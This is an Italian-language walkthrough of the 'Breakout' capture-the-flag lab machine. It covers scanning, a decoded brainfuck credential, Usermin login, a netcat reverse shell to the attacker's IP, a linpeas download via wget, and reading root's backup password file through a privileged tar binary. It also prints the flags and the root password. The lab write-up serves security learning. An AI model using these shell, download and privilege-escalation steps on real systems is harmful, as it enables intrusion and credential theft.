@@ -1,0 +1,138 @@
+//Tip: Ricerca anche nei file di backup, specialmente di password vecchie
+//     Uso di programmi creati dal root e che si possono utilizzare anche in modo non root
+
+### INFORMATION GATHERING ###
+
+╰─ nmap -Pn -A 192.168.1.229
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 18:30 CEST
+Nmap scan report for breakout.lan (192.168.1.229)
+Host is up (0.0023s latency).
+Not shown: 995 filtered tcp ports (no-response)
+PORT      STATE SERVICE     VERSION
+80/tcp    open  http        Apache httpd 2.4.51 ((Debian))  
+|_http-server-header: Apache/2.4.51 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+139/tcp   open  netbios-ssn Samba smbd 4.6.2
+445/tcp   open  netbios-ssn Samba smbd 4.6.2
+10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
+|_http-server-header: MiniServ/1.981
+|_http-title: 200 &mdash; Document follows
+20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
+|_http-title: 200 &mdash; Document follows
+|_http-server-header: MiniServ/1.830
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-06-23T16:30:53
+|_  start_date: N/A
+|_clock-skew: 1s
+|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.04 seconds
+
+porta 80: porta alla pagina di configurazione di apache, niente di che le prime righe, ma scorrendo in fondo trovo:
+
+<!--
+don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
+
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
+
+
+-->  Pare sia una stringa criptata, ed il linguaggio pare scritto in brainfuck, quindi vado su un decodificatore online (https://www.dcode.fr/brainfuck-language) e mettendo la stringa, mi decodifica (sulla sinistra) e corrisponde a:
+     .2uqPEfj3D<P'a-3
+
+
+porta 10000: dopo aver eseguito il redirect su https://breakout.lan:10000/ mi trovo una pagina di login di webmin
+porta 20000: stessa cosa per la porta 10000 ma in questo caso ho un login per usermin
+
+analizzando il codice sorgente della 10000, vedo delle cartelle tipo "/unauthenticated" idem per la 20000, faccio quindi gobuster su entrambe -> non ottengo nulla di che
+
+
+Lanciando enum4linux riesco ad avere la stringa: S-1-22-1-1000 Unix User\cyber (Local User) <--- quindi un utente della macchina si chiama cyber
+
+perfetto quindi ho che uno user si chiama cyber, e la sua potenziale password è: .2uqPEfj3D<P'a-3, mi collego quindi al sito usermin, e provo la combinazione, e va.
+Ora vedendo l'interfaccia, vedo in basso a sinistra un'icona di una shell, la clicco e quindi faccio ls e mi sputa fuori il file user.txt, la flag utente della macchina.
+catto il file ed ho: 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}  <--- PRIMA FLAG !!! :D
+
+### REVERSE SHELL ###
+
+Provo quindi ad ottenere una reverse shell
+su kali metto: nc -lvnp 9001
+Quindi nella shell del sito metto: nc 10.0.2.15 9001 -e /bin/bash
+
+Ottengo quindi la shell che fa schifo a vedersi e la abbellisco con il solito comando: python3 -c "import pty; pty.spawn('/bin/bash')"
+ed ora ho la solita interfaccia: cyber@breakout:~$ 
+
+Ora cerchiamo di diventare root.
+
+### PRIV ESC ###
+Mi passo linpeas:
+sulla macchina kali avvio il server python nella directory dove ho linpeas: python3 -m http.server 9999
+sulla macchina vittima uso: wget 192.168.1.57:9999/linpeas.sh 
+e così me lo sono passato.
+ora faccio chmod +x linpeas.sh e poi lo avvio con ./linpeas.sh
+
+lo faccio runnare, trova delle vulnerabilità come i SUID attivi che potevo trovare anche con il comando: find / -user root -perm /4000
+vedo che su GTFOBins potrei eseguire quello di "su" ma facendo sudo su, mi dice che non riconosce sudo come comando. È inutile proseguire così.
+
+Facendo ls, vedo che ho anche un file tar, che è un eseguibile, e facendo ls -la: -rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar  <- quindi il proprietario è root, devo sfruttarlo per cercare di diventare root
+
+vedendo linpeas vedo che mi scannerizza varie cose tra cui i file di backup ╔══════════╣ Backup files
+e cercando su google dove sono localizzati i backup file, mi risulta: "all backup data is stored in the directory /var/lib/psa/dumps"
+
+quindi faccio cd .. > cd .. > cd var e facendo ls -la, trovo una cartella backups, facendo quindi ls -la
+
+cyber@breakout:/var/backups$ ls -la
+ls -la
+total 28
+drwxr-xr-x  2 root root  4096 Jun 23 12:29 .
+drwxr-xr-x 14 root root  4096 Oct 19  2021 ..
+-rw-r--r--  1 root root 12732 Oct 19  2021 apt.extended_states.0
+-rw-------  1 root root    17 Oct 20  2021 .old_pass.bak
+
+ma ovviamente se provo a cattarlo mi dice che non ho i permessi.
+QUINDI
+uso il programma tar che si trova in /home/cyber, creando quindi un file compresso contenente il file .old_pass.bak, poi lo vado ad estrarre e poi lo vado ad aprire. QUINDI
+
+cyber@breakout:~$ ./tar pwd.tar /var/backups/.old_pass.bak
+./tar pwd.tar /var/backups/.old_pass.bak
+./tar: invalid option -- '.'
+Try 'tar --help' or 'tar --usage' for more information.
+
+cyber@breakout:~$ ./tar -cf pwd.tar /var/backups/.old_pass.bak
+./tar -cf pwd.tar /var/backups/.old_pass.bak
+./tar: Removing leading `/' from member names
+
+cyber@breakout:~$ ls
+ls
+lib.so  linpeas.sh  pwd.tar  tar  user.txt
+
+cyber@breakout:~$ tar -xvf pwd.tar
+tar -xvf pwd.tar
+var/backups/.old_pass.bak
+
+cyber@breakout:~$ ls
+lib.so  linpeas.sh  pwd.tar  tar  user.txt  var
+
+cyber@breakout:~$ cd var
+cyber@breakout:~/var$ cd backups
+cyber@breakout:~/var/backups$ cat .old_pass.bak
+cat .old_pass.bak
+Ts&4&YurgtRX(=~h <-- password del root
+
+^^^ PRATICAMENTE FACENDO COSÌ IL FILE .old_pass.bak è passato da essere stato creato da root ad essere stato cyber => facendo ls -la in var/backups/ presente su /home/cyber/ ottengo: 
+-rw------- 1 cyber cyber   17 Oct 20  2021 .old_pass.bak
+
+avedo la password del root, basta fare su - => metto la password trovata e mi trovo nella directory root, quindi facendo ls, ho solo il file rOOt.txt e cattandolo trovo che la flag è:
+3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
+ 
+
+
+
+
+
+
